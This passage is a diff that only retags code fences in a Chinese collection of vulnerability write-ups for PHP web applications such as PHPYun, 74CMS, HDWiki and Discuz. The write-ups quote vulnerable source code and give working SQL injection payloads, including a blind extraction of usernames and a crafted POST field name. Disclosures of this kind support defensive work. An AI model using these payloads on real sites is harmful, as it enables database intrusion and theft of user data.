                     $this->obj->ACT_layer_msg("请填写正确的数量！",8,$_SERVER['HTTP_REFERER']);
@@ -5592,7 +5592,7 @@ UPDATE `phpyun_reward` SET `stock`=`stock`-1+1,name=(select concat(username,0x23
 
 第二处在 api\alipay\alipayto.php
 
-```
+```php
 require_once(dirname(dirname(dirname(__FILE__)))."/data/db.config.php");
 
 require_once(dirname(dirname(dirname(__FILE__)))."/data/db.safety.php");//添加了过滤的进来。
@@ -5672,7 +5672,7 @@ if((int)$_POST['is_invoice']=='1'&&$config["sy_com_invoice"]){
 
 但是。。
 
-```
+```php
 if($_POST['linkway']=='1'){
 
         $com_sql=$db->query("select `linkman`,`linktel`,`address` from `".$db_config["def"]."company` where `uid`='".$_COOKIE['uid']."'");//查询余额
@@ -5726,7 +5726,7 @@ if($_POST['linkway']=='1'){
 
 在 model/redeem.class.php 中
 
-```
+```php
 function dh_action(){
 
         $this->public_action();
@@ -5860,7 +5860,7 @@ function dh_action(){
         } 
 ```
 
-```
+```php
 function DB_update_all($tablename, $value, $where = 1){
 
         $SQL = "UPDATE `" . $this->def . $tablename . "` SET $value WHERE $where";
@@ -5880,7 +5880,7 @@ function DB_update_all($tablename, $value, $where = 1){
 
 可以看到前面有三个比较。
 
-```
+```php
 if($_POST['num']<1){ //这里比较是否小于 1 php 弱语言 像 1asdxx 都能过。
 
                     $this->obj->ACT_layer_msg("请填写正确的数量！",8,$_SERVER['HTTP_REFERER']);
@@ -5944,7 +5944,7 @@ UPDATE `phpyun_reward` SET `stock`=`stock`-1+1,name=(select concat(username,0x23
 
 第二处在 api\alipay\alipayto.php
 
-```
+```php
 require_once(dirname(dirname(dirname(__FILE__)))."/data/db.config.php");
 
 require_once(dirname(dirname(dirname(__FILE__)))."/data/db.safety.php");//添加了过滤的进来。
@@ -6024,7 +6024,7 @@ if((int)$_POST['is_invoice']=='1'&&$config["sy_com_invoice"]){
 
 但是。。
 
-```
+```php
 if($_POST['linkway']=='1'){
 
         $com_sql=$db->query("select `linkman`,`linktel`,`address` from `".$db_config["def"]."company` where `uid`='".$_COOKIE['uid']."'");//查询余额
@@ -6076,7 +6076,7 @@ if($_POST['linkway']=='1'){
 
 在 hy/member/homepage_ctrl/pic_fm.php 中
 
-```
+```php
 if(count($pids)<1) showerr("请选择一张图片");
 
 if(!$psid) showerr("请指定一个图集");
@@ -6100,7 +6100,7 @@ foreach($pids as $pid){
 
 在 hy/member/homepage_ctrl/pic_upload.php 中
 
-```
+```php
 foreach($photoDB[url] AS $key=>$value){
 
         if(!eregi("\.(gif|jpg|jpeg|png|bmp)$",$value)){
@@ -6234,7 +6234,7 @@ P.S:这很不好意思 之前测试 demo 的时候 因为有个是个 update 的
 
 在 user/personal/personal_resume.php 中
 
-```
+```php
 elseif ($act=='make4_save')
 
 {
@@ -6278,7 +6278,7 @@ inserttable(table('resume_education')
 
 然后继续看 check_resume
 
-```
+```php
 function check_resume($uid,$pid)
 
 {
@@ -6392,7 +6392,7 @@ $resume_education=get_resume_education($uid,$pid);
 
 这里把刚才入库的查询了出来 所以单引号就出来了。 继续看。
 
-```
+```php
 $setsqlarr['key']=$resume_basic['intention_jobs'].$resume_basic['recentjobs'].$resume_basic['specialty'];        
 
         $setsqlarr['key']="{$resume_basic['fullname']} ".$sp->extracttag($setsqlarr['key']);
@@ -6482,7 +6482,7 @@ ps. 更新程序了应该还是把日期更新了一下 要不别人会一直以
 
 在 user/pms.php 中
 
-```
+```php
 function doblacklist(){
 
         if(isset($this->post['blacklist'])){
@@ -6506,7 +6506,7 @@ $blacklist = htmlspecialchars(string::stripscript($this->post['blacklist'])
 
 post 都会转义的。 来看看这函数 stripscript
 
-```
+```php
 function stripscript($string){
 
         $pregfind=array("/<script.*>.*<\/script>/siU",'/on(error|mousewheel|mouseover|click|load|onload|submit|focus|blur|start)="[^"]*"/i');
@@ -6524,7 +6524,7 @@ function stripscript($string){
 
 这是过滤了一些 xss 常用的。
 
-```
+```php
 function add_blacklist($blacklist,$uid){
 
         return($this->db->query("REPLACE INTO ".DB_TABLEPRE."blacklist (uid,blacklist) VALUES('$uid','$blacklist')"));
@@ -6538,7 +6538,7 @@ function add_blacklist($blacklist,$uid){
 
 依旧在 control/pms.php 中
 
-```
+```php
 function dobox(){
 
         $this->get[3] = empty($this->get[3]) ? NULL : $this->get[3];
@@ -6552,7 +6552,7 @@ function dobox(){
         $count = $_ENV['pms']->get_totalpms($this->user['uid'], $this->get[2]); 
 ```
 
-```
+```php
 function get_totalpms($uid, $type, $group=''){
 
         $sqladd = '';
@@ -6596,7 +6596,7 @@ function get_totalpms($uid, $type, $group=''){
 
 $blacklist = $this->get_blacklist($uid);
 
-```
+```php
 function get_blacklist($uid){
 
         $user = $this->db->fetch_first("SELECT blacklist FROM ".DB_TABLEPRE."blacklist WHERE uid='".$uid."'");
@@ -6608,7 +6608,7 @@ function get_blacklist($uid){
 
 这里把刚才入库的查询了出来 成功引入了单引号。
 
-```
+```php
 $blackuser = str_replace(",","','",$blacklist);
 
                 if($group){
@@ -6680,7 +6680,7 @@ $blackuser = str_replace(",","','",$blacklist);
 
 于是我们发现代码如下：
 
-```
+```php
 function info_action(){
 
         if($_POST["submitBtn"]){
@@ -6736,13 +6736,13 @@ function info_action(){
 
 火狐插件提交语句为：
 
-```
+```php
 name=123123&sex=6&birthday=1988-01-01&marriage=8&height=&nationality=&weight=&province=3&city=38&three_city=400&idcard=&telphone=13989765678&telhome=&email=testtest%**.**.**.**&edu=9&provinceid=9&cityid=88&three_cityid=485&exp=18&address=dsfsdfdsfsdf&submitBtn=+%B1%A3+%B4%E6&description%60%3D%28select+%40%40version%29%23=123 
 ```
 
 也可以使用 burp 提交：
 
-```
+```php
 name=123123&sex=6&birthday=1988-01-01&marriage=8&height=&nationality=&weight=&province=3&city=38&three_city=400&idcard=&telphone=13989765678&telhome=&email=testtest%**.**.**.**&edu=9&provinceid=9&cityid=88&three_cityid=485&exp=18&address=dsfsdfdsfsdf&submitBtn=%2B%B1%A3%2B%B4%E6&description%60%3D%28select%2B%40%40version%29%23=123 
 ```
 
@@ -6784,7 +6784,7 @@ bbs 中发文章的时候 直接把$_POST 数据带入 拼接 sql 功能函数�
 
 /bbs/add-archive.php 30 行
 
-```
+```php
 if($id = $archive->inserData($_POST)){ 
 ```
 
@@ -6792,7 +6792,7 @@ if($id = $archive->inserData($_POST)){
 
 /bbs/model/db/base.php 38 行
 
-```
+```php
 public function inserData($data){
 
        $r = $this->odb->insert($this->tblName,$data); //在跟入
@@ -6810,7 +6810,7 @@ public function inserData($data){
 
 /bbs/commonlib/db.php
 
-```
+```php
 public function insert($table, $data)
 
     {
@@ -6822,7 +6822,7 @@ public function insert($table, $data)
     } 
 ```
 
-```
+```php
 public function getInsertString($table, $data)
 
     {
@@ -6854,7 +6854,7 @@ public function getInsertString($table, $data)
     } 
 ```
 
-```
+```php
 public function filterString($str)
 
     {
@@ -6938,7 +6938,7 @@ mysql 日志 ：
 
 0x01 在 control/comment.php 中
 
-```
+```php
 function doreport(){
 
         $usernames=array();
@@ -7022,7 +7022,7 @@ function doreport(){
         $_ENV['pms']->send_ownmessage($sendarray); 
 ```
 
-```
+```php
 function send_ownmessage($sendarray){
 
         $pmsresult = true;
@@ -7054,7 +7054,7 @@ function send_ownmessage($sendarray){
     } 
 ```
 
-```
+```php
 词条的评论（共 1 条）返回词条
 
 xiaoyu 时间：12-19 00:47
@@ -7098,7 +7098,7 @@ INSERT INTO wiki_pms (`from`,`fromid`,`drafts`,`toid`,`to`,`subject`,`message`,`
 
 0x02 control/doc.php
 
-```
+```php
 function docheckrecipient(){
 
         $sendto = $this->post['sendto'];
@@ -7126,7 +7126,7 @@ function docheckrecipient(){
     } 
 ```
 
-```
+```php
 function hiconv($str,$to='',$from='',$force=false) {
 
         if (empty($str)) return $str;
@@ -7194,7 +7194,7 @@ function hiconv($str,$to='',$from='',$force=false) {
     } 
 ```
 
-```
+```php
 function check_recipient($sendto, $type){
 
         $userinfos = array();
@@ -7234,7 +7234,7 @@ sendto=a%E9%8C%A6%27) or CASE WHEN(substr((select username from wiki_user where 
 
 0x03 control/doc.php 中
 
-```
+```php
 function dochangename(){
 
         $ajaxtitle = trim($this->post['newname']);
@@ -7286,7 +7286,7 @@ function dochangename(){
 
 0x04 control/edition.php
 
-```
+```php
 function doremove(){
 
         $did=isset($this->post['did'])?$this->post['did']:$this->get[2];
@@ -7308,7 +7308,7 @@ function doremove(){
         $result=$_ENV['doc']->remove_edition($eids, $did);//带入查询 
 ```
 
-```
+```php
 function remove_edition($eid, $did=0){
 
         if(is_array($eid)){
@@ -7330,7 +7330,7 @@ function remove_edition($eid, $did=0){
 
 0x05 依旧 control/edition.php
 
-```
+```php
 function doexcellent(){
 
         foreach(@$this->post['eid'] as $eid){
@@ -7346,7 +7346,7 @@ function doexcellent(){
         $result=$_ENV['doc']->set_excellent_edition($this->post['eid']); 
 ```
 
-```
+```php
 function set_excellent_edition($eid,$type=1){
 
         if(is_array($eid)){
@@ -7366,7 +7366,7 @@ function set_excellent_edition($eid,$type=1){
 
 0x06 control/doc.php 中
 
-```
+```php
 function docreate(){
 
         if(4 != $this->user['groupid'] && ($this->time-$this->user['regtime'] < $this->setting['forbidden_edit_time']*60)){
@@ -7626,7 +7626,7 @@ VALUES (56,'x','xiaoyuxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx
 
 1418925356,1418925356,'xiaoyu','2','1',0)
 
-```
+```php
 POST /dan/hdwiki/index.php?doc-create HTTP/1.1
 
 Host: web
@@ -7732,7 +7732,7 @@ Content-Disposition: form-data; name="publishsubmit"
 
 0x07 control/pms.php 中
 
-```
+```php
 function doblacklist(){
 
         if(isset($this->post['blacklist'])){
@@ -7748,7 +7748,7 @@ function doblacklist(){
                 $result = $_ENV['pms']->add_blacklist($blacklist,$this->user['uid']); 
 ```
 
-```
+```php
 function add_blacklist($blacklist,$uid){
 
         return($this->db->query("REPLACE INTO ".DB_TABLEPRE."blacklist (uid,blacklist) VALUES('$uid','$blacklist')"));
@@ -7756,7 +7756,7 @@ function add_blacklist($blacklist,$uid){
     }//入库 
 ```
 
-```
+```php
 function dobox(){
 
         $this->get[3] = empty($this->get[3]) ? NULL : $this->get[3];
@@ -7770,7 +7770,7 @@ function dobox(){
         $count = $_ENV['pms']->get_totalpms($this->user['uid'], $this->get[2]);//出库 
 ```
 
-```
+```php
 function get_blacklist($uid){
 
         $user = $this->db->fetch_first("SELECT blacklist FROM ".DB_TABLEPRE."blacklist WHERE uid='".$uid."'");
@@ -7778,7 +7778,7 @@ function get_blacklist($uid){
         return $user['blacklist']; 
 ```
 
-```
+```php
 $blackuser = str_replace(",","','",$blacklist);
 
                 if($group){
@@ -7830,7 +7830,7 @@ $blackuser = str_replace(",","','",$blacklist);
 
 include/discuzcode.func.php
 
-```
+```php
 function discuzcode($message, $smileyoff, $bbcodeoff, $htmlon = 0, $allowsmilies = 1, $allowbbcode = 1, $allowimgcode = 1, $allowhtml = 0, $jammer = 0, $parsetype = '0', $authorid = '0', $allowmediacode = '0', $pid = 0) {
 
     global $discuzcodes, $credits, $tid, $discuz_uid, $highlight, $maxsmilies, $db, $tablepre, $hideattach, $allowattachurl;
